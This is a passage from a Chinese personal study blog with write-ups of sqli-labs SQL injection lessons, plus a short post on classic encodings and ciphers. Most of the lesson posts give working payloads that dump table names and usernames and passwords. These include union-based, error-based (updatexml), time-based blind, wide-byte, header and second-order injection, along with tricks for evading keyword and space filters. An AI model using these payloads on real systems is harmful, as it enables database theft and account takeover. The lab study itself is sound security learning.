class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot; margin-top:9px;margin-left:90px;&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot; margin-top:10px;color:#FFF; font-size:23px; text-align:center&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;3&quot;</span> <span class="attr">color</span>=<span class="string">&quot;#FFFF00&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/Less-34.jpg&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">color</span>= <span class="string">&quot;#FFFF00&quot;</span> <span class="attr">font</span> <span class="attr">size</span> = <span class="string">4</span>&gt;</span><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&quot;3&quot;</span> <span class="attr">color</span>=<span class="string">&quot;#0000ff&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span>Your Login name:1<span class="tag">&lt;<span class="name">br</span>&gt;</span>Your Password:2<span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;../images/flag.jpg&quot;</span>  /&gt;</span><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">font</span> <span class="attr">size</span>=<span class="string">&#x27;4&#x27;</span> <span class="attr">color</span>= <span class="string">&quot;#33FFFF&quot;</span>&gt;</span></span><br><span class="line">Hint: The Username you input is escaped as : aß\&#x27; union select 1,2#<span class="tag">&lt;<span class="name">br</span>&gt;</span>Hint: The Password you input is escaped as : n<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">font</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>倒数第12行看到我们注入成功了，后面明显我们可以套用联合查询来注入</p>
<h2 id="网上一直在传的方法二"><a href="#网上一直在传的方法二" class="headerlink" title="网上一直在传的方法二"></a>网上一直在传的方法二</h2><p>get型注入是直接以url形式提交的，而post型就会对数据进行urlencode处理</p>
<p>所以使</p>
<p>�’ union select  1,database()#</p>
<p>来注入,</p>
<p><img src="https://s2.loli.net/2022/02/14/HjPdvs5g7cJSBXt.png" alt="QQ截图20220214155510.png"></p>
<p><img src="https://s2.loli.net/2022/02/14/6u7mKTAbo2CPH8Y.png" alt="QQ截图20220214155606.png"></p>
<h1 id="lesson-35"><a href="#lesson-35" class="headerlink" title="lesson 35"></a>lesson 35</h1><p>首先是多次尝试发现没有对数据进行包裹</p>
<p>?id=-1 union select 1,database(),3–+</p>
<p><img src="https://s2.loli.net/2022/02/14/yz4cmQ6qHSXsiEb.png" alt="QQ截图20220214164727.png"></p>
<p>?id=-1 union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
<p><img src="https://s2.loli.net/2022/02/14/8df37KGFqsthcvb.png" alt="QQ截图20220214165031.png"></p>
<p>然后发现连数据都不包裹的，竟然还会把我的单引号注释掉</p>
<p>使用16进制来绕过注释</p>
<h2 id="时间（延迟）注入"><a href="#时间（延迟）注入" class="headerlink" title="时间（延迟）注入"></a>时间（延迟）注入</h2><p>?id=1 and if(    length(database())=1,sleep(3),1    )–+</p>
<p>?id=1 and if(      left(database(),1)=’s’,sleep(3),1     )–+</p>
<h1 id="lesson-36"><a href="#lesson-36" class="headerlink" title="lesson 36"></a>lesson 36</h1><p>使用了mysql_real_escape_string()函数来进行过滤，对于该函数而言，它会转义</p>
<p>\x00 \n \r ‘ “ \x1a</p>
<p>是用单引号来对数据进行包裹</p>
<p>并且不出以外的有宽字节注入</p>
<p>?id=-1%df’union select 1,database(),group_concat(table_name)from information_schema.tables where table_schema=database()–+</p>
<p><img src="https://s2.loli.net/2022/02/14/7p1mGWcyLghszRf.png" alt="QQ截图20220214183150.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/31/lesson27/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.jpg">
      <meta itemprop="name" content="wang deshan">
      <meta itemprop="description" content="ctf/python/c++">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wds's 学习博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/01/31/lesson27/" class="post-title-link" itemprop="url">lesson27_28a</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-01-31 13:36:21" itemprop="dateCreated datePublished" datetime="2022-01-31T13:36:21+08:00">2022-01-31</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-02-18 20:26:40" itemprop="dateModified" datetime="2022-02-18T20:26:40+08:00">2022-02-18</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="lesson27"><a href="#lesson27" class="headerlink" title="lesson27"></a>lesson27</h1><p><img src="https://s2.loli.net/2022/02/11/qPV5SrDFJY23Llb.png" alt="QQ截图20220211160219.png"></p>
<p>因为没有报错的回显所以我们采用联合查询</p>
<p>又因为select和union又被过滤，所以我们采用uNion和sElect </p>
<p>?id=11111’  %0b uNion %0b sElect %0b 1,2,3 ||’1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/11/d9YUSojrPWRaHmv.png" alt="QQ截图20220211185056.png"></p>
<p>?id=11111’  %0b uNion %0b sElect %0b 1,database(),3 ||’1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/11/v5Fg7dP8WMDxslQ.png" alt="QQ截图20220211185216.png"></p>
<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema=’security’)),3 ||’1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/11/rKFUIOTysvoJqBl.png" alt="QQ截图20220211185630.png"></p>
<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name=’users’)),3 ||’1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/11/ldb9HrIsU8RKqaB.png" alt="QQ截图20220211185828.png"></p>
<p>?id=11111’  %0b uNion %0b sElect %0b 1,(sElect(group_concat(concat_ws(0x7e,username,password)))from(security.users)),3 ||’1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/11/SbZC5cD3FqGHPLW.png" alt="QQ截图20220211190332.png"></p>
<h1 id="lesson27a"><a href="#lesson27a" class="headerlink" title="lesson27a"></a>lesson27a</h1><p>lesson27a是相同的方法，和lesson27一样</p>
<p>主要是空格用%a0或者%0b来代替</p>
<h1 id="lesson-28"><a href="#lesson-28" class="headerlink" title="lesson 28"></a>lesson 28</h1><p>由</p>
<p><a target="_blank" rel="noopener" href="http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=">http://sqli-labs/Less-28/?id=1&#39;)||(&#39;1&#39;)=</a>(‘1</p>
<p>是（’’）的包裹方式</p>
<p>我这里采用盲注来做，但是很多师傅的参考都是用联合查询来做的，我的sql-liblesson28抽风了，空格老是被注释了</p>
<p>?id=0’)||left(database(),2)=’se’;%00</p>
<p><img src="https://s2.loli.net/2022/02/12/FevtEJ57W81Gx6B.png" alt="QQ截图20220212184908.png"></p>
<p>盲注爆出库，表，列</p>
<h1 id="lesson-28a"><a href="#lesson-28a" class="headerlink" title="lesson 28a"></a>lesson 28a</h1><p>同样的payload，lesson28也可以做，所以跳过了</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/26/lesson24/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.jpg">
      <meta itemprop="name" content="wang deshan">
      <meta itemprop="description" content="ctf/python/c++">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wds's 学习博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/01/26/lesson24/" class="post-title-link" itemprop="url">lesson24_26a</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-01-26 11:14:16" itemprop="dateCreated datePublished" datetime="2022-01-26T11:14:16+08:00">2022-01-26</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-02-18 20:28:12" itemprop="dateModified" datetime="2022-02-18T20:28:12+08:00">2022-02-18</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="lesson-24-second-order-injection-二次注入"><a href="#lesson-24-second-order-injection-二次注入" class="headerlink" title="lesson 24 second order injection(二次注入)"></a>lesson 24 second order injection(二次注入)</h1><p>第一步：插入恶意数据</p>
<p>  第一次进行数据库插入数据的时候 ，仅仅对其中的特殊符号进行转移，在写入数据库的时候还是保留的原来的数据，但是数据本身包含恶意内容。</p>
<p>第二步：引用恶意数据</p>
<p>  在将数据存入数据库后，开发者认为数据是可信的，在下一次需要进行的查询的时候，直接从数据库中提取出恶意的数据，没有进行进一步的审查和处理，就会造成sql的二次注入</p>
<p><img src="https://s2.loli.net/2022/02/10/3epZOLiJ2jVUSN8.png" alt="QQ截图20220210114019.png"></p>
<p>一开始有一个普通用户</p>
<p><img src="https://s2.loli.net/2022/02/10/DsGjFoLQ37cxZrT.png" alt="QQ截图20220210130715.png"></p>
<p>账号：admin</p>
<p>密码：admin</p>
<p>然后我们（黑客）注册一个新的账号</p>
<p><img src="https://s2.loli.net/2022/02/10/HhZUVG63Bp4JleE.png" alt="QQ截图20220210130845.png"></p>
<p>账号：admin’#        </p>
<p>密码：123456</p>
<p>然后登入修改密码。</p>
<p><img src="https://s2.loli.net/2022/02/10/x1IZWh4JC7HBVE6.png" alt="QQ截图20220210131006.png"></p>
<img src="https://s2.loli.net/2022/02/10/jMmFSRH2pQwLWbd.png" alt="QQ截图20220210131200.png" style="zoom:150%;" />

<p>然后当我们用admin的帐号登入时，发现密码被恶意修改了</p>
<p><img src="https://s2.loli.net/2022/02/10/TtXzn9W8HoUGPxe.png" alt="QQ截图20220210131303.png"></p>
<p>这里就是在我们用admin‘#的账号修改密码时，数据库提取我们的恶意数据没有进行转意使得原本用来修改密码的语句:</p>
<p>UPDATE users SET PASSWORD=’$pass’ where username=’admin’#’ and password=’&amp;curr_pass’</p>
<p>变成了</p>
<p>UPDATA users SET PASSWORD=’$pass’ where username=’admin’</p>
<p>导致密码被修改。。。。</p>
<h1 id="lesson25"><a href="#lesson25" class="headerlink" title="lesson25"></a>lesson25</h1><p>黑名单里面 ‘or’ ‘and’被过滤了</p>
<p><img src="https://s2.loli.net/2022/02/10/vYLRFpD6jd8o291.png" alt="QQ截图20220210131449.png"></p>
<p>用双写来绕过</p>
<p>数据库</p>
<p>?id=-1’ union select 1,database(),3 anandd ‘1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/10/mRkdLg6e8vZbBDy.png" alt="QQ截图20220210163701.png"></p>
<p>表</p>
<p>?id=-1’ union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’),3 anandd ‘1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/10/javtyi4HwoYlEeK.png" alt="QQ截图20220210165641.png"></p>
<p>列</p>
<p>?id=-1’ union select 1,(select group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’),3 anandd ‘1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/10/78Cobgc6xOWniBr.png" alt="QQ截图20220210170055.png"></p>
<p>字段</p>
<p>?id=-1’ union select 1,(select group_concat(concat_ws(‘@@’,id,username,passwoorrd))from users),3 anandd ‘1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/10/ekXN37wJZHVj14q.png" alt="QQ截图20220210171358.png"></p>
<p>PS:information和password里面都有or要双写。</p>
<h1 id="lesson-25a"><a href="#lesson-25a" class="headerlink" title="lesson 25a"></a>lesson 25a</h1><p>与上一关相同</p>
<p>同样的黑名单过滤了or和and</p>
<p>就是闭合不同。。。</p>
<h1 id="lesson26"><a href="#lesson26" class="headerlink" title="lesson26"></a>lesson26</h1><p><img src="https://s2.loli.net/2022/02/10/gePrwp1ZIFacDM2.png" alt="QQ截图20220210173023.png"></p>
<p>查库</p>
<p>?id=1’||updatexml(1,concat(0x7e,(database())),1)||’1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/10/XaRNkyO5PG3ovUA.png" alt="QQ截图20220210221443.png"></p>
<p>查表</p>
<p>?id=1’||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=’security’))),1)||’1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/10/tB5bxJQDqmkphzl.png" alt="QQ截图20220210221611.png"></p>
<p>查列</p>
<p>?id=1’||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=’users’))),1)||’1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/10/dJGyOLD13MxXIVW.png" alt="QQ截图20220210221718.png"></p>
<p>字段</p>
<p>?id=1’||updatexml(1,concat(0x7e,(select    (group_concat(concat_ws(0x7e,username,passwoorrd))) from (security.users)  )),1)||’1’=’1</p>
<p><img src="https://s2.loli.net/2022/02/11/O9I65hUse34rL71.png" alt="QQ截图20220210230328.png"></p>
<p>%a0也可以充当空格，注释符可以用;%00或者||’1’=’1</p>
<h1 id="lesson-26a"><a href="#lesson-26a" class="headerlink" title="lesson 26a"></a>lesson 26a</h1><p>黑名单一样只是闭合多了括号</p>
<p>因为没有报错信息，所以我们只能用联合查询</p>
<p>黑名单中对空格做了过滤，所以我们可以用%a0来代替空格</p>
<p>基本与lesson26相同</p>
<p>?id=1’) %a0 union %a0 select%a0 1,2,3 || (‘1’)=(‘1</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/14/warmup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.jpg">
      <meta itemprop="name" content="wang deshan">
      <meta itemprop="description" content="ctf/python/c++">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wds's 学习博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/14/warmup/" class="post-title-link" itemprop="url">hctf2018warmup</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-14 20:53:10" itemprop="dateCreated datePublished" datetime="2021-12-14T20:53:10+08:00">2021-12-14</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-01-30 12:13:44" itemprop="dateModified" datetime="2022-01-30T12:13:44+08:00">2022-01-30</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/php%E5%AD%A6%E4%B9%A0-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">php学习 代码审计</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="buu的web入门第一题"><a href="#buu的web入门第一题" class="headerlink" title="buu的web入门第一题"></a>buu的web入门第一题</h1>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/12/%E7%BC%96%E7%A0%81%E7%AF%87/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.jpg">
      <meta itemprop="name" content="wang deshan">
      <meta itemprop="description" content="ctf/python/c++">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wds's 学习博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/12/12/%E7%BC%96%E7%A0%81%E7%AF%87/" class="post-title-link" itemprop="url">编码篇</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-12-12 15:11:28" itemprop="dateCreated datePublished" datetime="2021-12-12T15:11:28+08:00">2021-12-12</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-02-23 12:50:38" itemprop="dateModified" datetime="2022-02-23T12:50:38+08:00">2022-02-23</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/misc/" itemprop="url" rel="index"><span itemprop="name">misc</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="Morse编码"><a href="#Morse编码" class="headerlink" title="Morse编码"></a>Morse编码</h1><p>摩尔斯电码(Morse code)是一种时通时断的信号代码，通过不同的排列 顺序来表达不同的英文字母、数字和标点符号。是由美国人艾尔菲德·维 尔(Alfred Lewis Vail)与萨缪尔·摩尔斯(Samuel Finley Breese Morse) 在1836年发明。由点（·）和划（-）组成。</p>
<p><img src="https://s2.loli.net/2021/12/12/B4nJizpyuHMCXm2.png" alt="CSDN_1639293456784.jpg"></p>
<p><a target="_blank" rel="noopener" href="http://www.mathsking.net/morse.htm">莫斯在线编码</a></p>
<h1 id="ascii编码"><a href="#ascii编码" class="headerlink" title="ascii编码"></a>ascii编码</h1><p>ASCII(American Standard Code for Information  Interchange，美国信息交换标准代码)是基于拉丁字母的一套  电脑编码系统，主要用于显示现代英语和其他西欧语言。它是现今最通用的单字节编码系统，并等同于国际标准ISO/IEC 646。</p>
<p><img src="https://s2.loli.net/2021/12/12/tgWfoxSkA892TcG.png" alt="CSDN_1639293840648.jpg"></p>
<p><a target="_blank" rel="noopener" href="http://www.ab126.com/goju/1711.html">ascii码翻译器</a></p>
<h1 id="Tap-Code敲击码"><a href="#Tap-Code敲击码" class="headerlink" title="Tap Code敲击码"></a>Tap Code敲击码</h1><p> 敲击码(Tap code)是一种以非常简单的方式对文本信息进行 编码的方法。因该编码对信息通过使用一系列的点击声音来编 码而命名，敲击码是基于 5 ×5 方格波利比奥斯方阵来实现的， 不同点是是用 K 字母被整合到 C 中。</p>
<p><img src="https://s2.loli.net/2021/12/12/1YukBIh74wpg3Ld.png" alt="CSDN_1639294020485.jpg"></p>
<p>2,3 1,5 3,1 3,1 3,4 ==&gt;H E L L O 或 .. …/. …../… ./… ./… …./ ==&gt;H E L L O</p>
<h1 id="Base编码"><a href="#Base编码" class="headerlink" title="Base编码"></a>Base编码</h1><p> Base64是网络上最常见的用于传输8Bit字节码的编码方式之一，Base64 就是一种基于64(65)个可打印字符来表示二进制数据的方法。 a-z、A-Z、0-9、符号“+”、“/”（再加上作为补位的”=”，实际上是 65个字符） 。</p>
<p>  Base xx 中的 xx 表示的是采用多少个字符进行编码，比如说 base64 就是采用 64 个字符编码，由于 2 的 6 次方等于 64，所以每 6 个比特 为一个单元，对应某个可打印字符。</p>
<p>例如：d2VsY29tZQ==   ==&gt;welcome</p>
<p>特点：base64 结尾可能会有=号，但最多有2个 。</p>
<p>base32 结尾可能会有=号,最多有 3 个等号。</p>
<p>根据 base 的不同，字符集会有所限制 。 有可能需要自己加等号。</p>
<p><a target="_blank" rel="noopener" href="http://tool.chinaz.com/tools/base64.aspx">base64在线解码</a></p>
<h1 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h1><p> URL编码,又叫百分号编码，是统一资源定位(URL)编码方式。URL地址 （常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊 用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码 处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js： 有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编 码方法很简单，在该字节ascii码的的16进制字符前面加%. 如空格字符， ascii码是32，对应16进制是‘20’，那么urlencode编码结果是:%20。</p>
<p>例如：URL%E7%BC%96%E7%A0%81   ==&gt; URL编码</p>
<p><a target="_blank" rel="noopener" href="http://tool.oschina.net/encode?type=4">URL在线解码</a></p>
<h1 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h1><p> Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界 标准,包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案 的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进 制编码，以满足跨语言、跨平台进行文本转换、处理的要求。1990年开始 研发，1994年正式公布。</p>
<p><a target="_blank" rel="noopener" href="http://tool.oschina.net/encode">Unicode在线解码</a></p>
<h1 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h1><p> JSFuck 可以让你只用 6 个字符 <a href=""> </a> ! + 来编写 JavaScript 程序</p>
<p><a target="_blank" rel="noopener" href="http://www.bugku.com/tools/jsfuck/">jsfuck在线解码</a></p>
<h1 id="brainfuck"><a href="#brainfuck" class="headerlink" title="brainfuck"></a>brainfuck</h1><p> Brainfuck 是一种极小化的计算机语言，按照”Turing complete(完整图灵机) “思想设计 的语言，它的主要设计思路是:用最小的概念实现一种“简单”的语 言，BrainF**k 语言 只有八种符号，所有的操作都由这八种符号  &gt; &lt; + - . , [ ]  的组合来完成。</p>
<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">brainfuck在线解码</a></p>
<h1 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h1><p>凯撒密码（Caesar）加密时会将明文中的每个字母都按照其在字母表中的顺序向后（或 向前）移动固定数目（循环移动）作为密文。例如，当偏移量是左移 3 的时候（解密时 的密钥就是 3）。</p>
<p>  使用时，加密者查找明文字母表中需要加密的消息中的每一个字母所在位置，并且写下密 文字母表中对应的字母。需要解密的人则根据事先已知的密钥反过来操作，得到原来的明文。</p>
<p>  根据偏移量的不同，还存在若干特定的恺撒密码名称：</p>
<p>  偏移量为 10：Avocat （A→K）</p>
<p>  偏移量为 13：ROT13</p>
<p>  偏移量为 -5：Cassis （K 6）</p>
<p>  偏移量为 -6：Cassette （K 7）</p>
<p>例如：Uryyb,Jrypbzr   ==&gt; Hello,Welcome</p>
<p><a target="_blank" rel="noopener" href="http://www.mxcz.net/tools/rot13.aspx">凯撒ROT13在线解码</a></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/Dog_Captain/article/d">https://blog.csdn.net/Dog_Captain/article/d</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/28/lesson18/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/uploads/avatar.jpg">
      <meta itemprop="name" content="wang deshan">
      <meta itemprop="description" content="ctf/python/c++">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wds's 学习博客">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/11/28/lesson18/" class="post-title-link" itemprop="url">lesson18-23</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2021-11-28 09:20:42" itemprop="dateCreated datePublished" datetime="2021-11-28T09:20:42+08:00">2021-11-28</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2022-02-10 11:00:02" itemprop="dateModified" datetime="2022-02-10T11:00:02+08:00">2022-02-10</time>
      </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/sql%E6%B3%A8%E5%85%A5/" itemprop="url" rel="index"><span itemprop="name">sql注入</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="less18-header-injection"><a href="#less18-header-injection" class="headerlink" title="less18 header injection"></a>less18 header injection</h1><p><img src="https://i.loli.net/2021/11/28/iUSL7pB8aXCKezf.png" alt="header injection.png"></p>
<p>登入成功返回我的ip地址和user agent</p>
<p>因为user agent在登入成功后会回显，所以理所当然的尝试在header的user agent注入</p>
<p>注入语句’ or updatexml(1,concat(0x7e,(database())),1) or ‘1’ =’1</p>
<p>直接在抓包处改</p>
<p><img src="https://i.loli.net/2021/11/28/IUwgv12aLkqbKDA.png" alt="header injection1.png"></p>
<p>后面就是正常的把database()改成其他的查库查列操作</p>
<p>或者使用方法二：</p>
